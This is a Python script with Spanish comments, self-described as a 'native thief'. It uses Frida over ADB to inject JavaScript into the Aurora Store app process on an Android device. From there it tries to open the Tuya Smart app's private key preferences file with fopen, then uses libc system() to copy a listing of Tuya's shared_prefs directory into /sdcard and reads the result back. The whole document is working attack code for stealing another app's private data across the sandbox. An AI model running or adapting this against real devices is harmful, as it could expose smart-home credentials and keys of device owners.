import frida
import sys
import subprocess
import time

# Inyectamos en Aurora Store
PACKAGE_NAME = "com.aurora.store" 

jscode = """
console.log("🚀 Ladrón Nativo Iniciado.");

// Buscar símbolos en libc.so explícitamente
var fopen_ptr = Module.findExportByName("libc.so", "fopen");
var system_ptr = Module.findExportByName("libc.so", "system");

if (!fopen_ptr) console.log("❌ No encontré 'fopen' en libc.so");
if (!system_ptr) console.log("❌ No encontré 'system' en libc.so");

if (fopen_ptr) {
    var fopen = new NativeFunction(fopen_ptr, 'pointer', ['pointer', 'pointer']);
    var pathStr = "/data/user/0/com.tuya.smart/shared_prefs/preferences_global_key.xml";
    var path = Memory.allocUtf8String(pathStr); 
    var mode = Memory.allocUtf8String("r");

    console.log("📂 Intentando abrir: " + pathStr);
    var fp = fopen(path, mode);
    
    if (fp.isNull()) {
        console.log("❌ 'fopen' falló (Permiso denegado). El Sandbox funciona.");
    } else {
        console.log("✅ ¡HACKEO NATIVO EXITOSO! Archivo abierto.");
        // Cerramos para ser educados
        var fclose = new NativeFunction(Module.findExportByName("libc.so", "fclose"), 'int', ['pointer']);
        fclose(fp);
    }
}

if (system_ptr) {
    try {
        var system = new NativeFunction(system_ptr, 'int', ['pointer']);
        console.log("⚠️ Intentando system('ls')...");
        var cmd = Memory.allocUtf8String("ls -l /data/user/0/com.tuya.smart/shared_prefs/ > /sdcard/tuya_ls.txt");
        var res = system(cmd);
        console.log("   Comando enviado (ret: " + res + ").");
    } catch(e) {
        console.log("❌ Error llamando a system(): " + e);
    }
}
"""

print(f"👻 Esperando al proceso {PACKAGE_NAME}...")

try:
    device = frida.get_usb_device()
    print(f"🔍 Buscando PID de Aurora Store (ADB)...")
    
    out = subprocess.check_output(["adb", "shell", "ps -A | grep com.aurora.store"], text=True)
    target_pid = None
    for line in out.strip().split('\n'):
        if "com.aurora.store" in line and ":" not in line: 
            target_pid = int(line.split()[1])
            break
            
    if not target_pid:
         print("❌ No encontré Aurora Store abierta.")
         sys.exit(1)

    print(f"✅ Inyectando Ladrón Nativo en PID: {target_pid}")
    session = device.attach(target_pid)
    
    script = session.create_script(jscode)
    script.on("message", lambda m, d: print(m['payload'] if 'payload' in m else m))
    script.load()
    
    print("⚡ Script Nativo Corriendo...")
    time.sleep(5)
    
    # Chequeamos resultado
    print("\n🔍 Verificando resultado de 'ls' en sdcard...")
    subprocess.run("adb shell cat /sdcard/tuya_ls.txt", shell=True)
    
    sys.stdin.read() 

except Exception as e:
    print(f"❌ Error: {e}")
